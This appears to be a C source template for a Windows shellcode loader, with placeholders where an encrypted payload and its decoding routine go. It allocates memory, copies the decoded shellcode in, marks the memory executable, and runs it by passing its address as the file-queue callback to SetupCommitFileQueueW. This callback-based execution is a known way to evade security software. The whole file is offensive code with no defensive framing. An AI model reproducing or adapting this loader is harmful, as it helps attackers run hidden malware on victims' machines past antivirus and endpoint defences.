#include <windows.h>
#include <stdio.h>
#include "base64.h"
#include "syscall.h"


#include <setupapi.h>
#pragma comment(lib, "Setupapi.lib")

char Ciphertext[] = "<Ciphertext>";

int main() {

	LPVOID addr = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(Ciphertext), MEM_COMMIT, PAGE_READWRITE, 0);

	<decode>

	memcpy(addr, &shellcode[0], sizeof(Ciphertext));

	DWORD pflOldProtect;
	VirtualProtect(addr, sizeof(Ciphertext), PAGE_EXECUTE_READ, &pflOldProtect);


	HSPFILEQ hQueue = ::SetupOpenFileQueue();
	::SetupQueueCopyW(hQueue, L"c:\\", L"\\windows\\sytem32\\", L"kernel32.dll", NULL, NULL, L"c:\\windows\\temp\\", L"kernel32.dll", SP_COPY_NOSKIP);
	::SetupCommitFileQueueW(::GetTopWindow(NULL), hQueue, (PSP_FILE_CALLBACK_W)addr, NULL);


	return 0;

}